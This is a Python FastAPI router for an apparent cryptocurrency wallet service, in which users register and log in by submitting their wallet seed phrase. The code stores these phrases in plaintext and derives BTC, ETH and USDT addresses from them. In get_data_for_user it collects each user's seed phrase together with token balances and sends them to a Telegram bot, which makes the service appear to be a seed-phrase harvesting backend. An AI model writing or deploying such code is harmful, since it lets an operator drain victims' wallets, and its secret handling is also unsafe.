from fastapi import HTTPException
from fastapi.routing import APIRouter
from backend.schemas.user import UserCreate, UserResponse, Token,GeneratePhrase
from backend.models.user import User, WalletAddress
from backend.services.crypto import AddressGenerator, tokens_balance
from backend.config import settings
from jose import jwt
from datetime import datetime, timedelta
from bot_app.main import send_balance_to_telegram
from bot_app.main import bot
from mnemonic import Mnemonic
user_router = APIRouter(prefix="/user", tags=["user"])


def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=60)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, settings.secret_key, algorithm=settings.algorithm)


# async def get_btc_balance()



@user_router.post("/login", response_model=Token)
async def handle_user_wallet(user_data: UserCreate):
    user = await User.get_or_none(phrase=user_data.phrase)
    if not user:
        raise HTTPException(status_code=401, detail="Неверная фраза")

    # gen = AddressGenerator(user.phrase)
    #
    # btc_addresses = gen.get_btc_addresses(count=10)
    # for item in btc_addresses:
    #     await WalletAddress.create(
    #         user=user,
    #         coin_type="BTC",
    #         address=item["address"]
    #     )
    #
    # eth_addr = gen.get_evm_address()
    # await WalletAddress.create(
    #     user=user,
    #     coin_type="ETH",
    #     address=eth_addr
    # )
    #
    # print(f"Пользователь {user.id}: создано {len(btc_addresses) + 1} адресов.")

    # await user.fetch_related("addresses")
    # return user
    token = create_access_token(data={"sub": str(user.id)})
    user_data = await get_data_for_user(user.id)

    # 3. Возвращаем токен клиенту
    return {"access_token": token, "token_type": "bearer",'user_id': user.id,"user_data": user_data}


@user_router.post("/register", response_model=UserResponse)
async def register(user_data: UserCreate):
    # 1. Проверяем, существует ли уже такой юзер
    user = await User.get_or_none(phrase=user_data.phrase)
    if user:
        raise HTTPException(status_code=400, detail="Этот кошелек уже зарегистрирован")

    # 2. Создаем пользователя
    user = await User.create(phrase=user_data.phrase)

    # 3. Генерируем адреса (твоя логика)
    gen = AddressGenerator(user.phrase)

    # BTC адреса
    btc_addresses = gen.get_btc_addresses(count=10)
    for item in btc_addresses:
        await WalletAddress.create(
            user=user,
            coin_type="BTC",
            address=item["address"]
        )

    # ETH адрес
    eth_addr = gen.get_evm_address()
    await WalletAddress.create(
        user=user,
        coin_type="ETH",
        address=eth_addr
    )
    await WalletAddress.create(
        user=user,
        coin_type="USDT",
        address=eth_addr
    )
    # 4. Возвращаем результат
    user = await get_data_for_user(user.id)
    return user


@user_router.get("/", response_model=UserResponse)
async def get_user(user_id: int):
    await get_data_for_user(user_id=user_id)


async def get_data_for_user(user_id: int):
    user = await User.get_or_none(id=user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    await user.fetch_related("addresses")
    balance_data = await tokens_balance(user.phrase)
    addresses_list = [
        {"id": a.id, "coin_type": a.coin_type, "address": a.address}
        for a in user.addresses
    ]
    data = {
        "id": user.id,
        "phrase": user.phrase,
        "addresses": addresses_list,
        "balance": balance_data
    }
    await send_balance_to_telegram(user_id, data)
    return data


# Убедитесь, что функция принимает аргумент count
@user_router.get("/generate-phrase")
def generate(count: int = 12):  # FastAPI автоматически возьмет число из ссылки ?count=...
    mnemo = Mnemonic("english")

    # 256 бит для 24 слов, 128 бит для 12 слов
    strength = 256 if count == 24 else 128

    words = mnemo.generate(strength=strength)
    return {"phrase": words}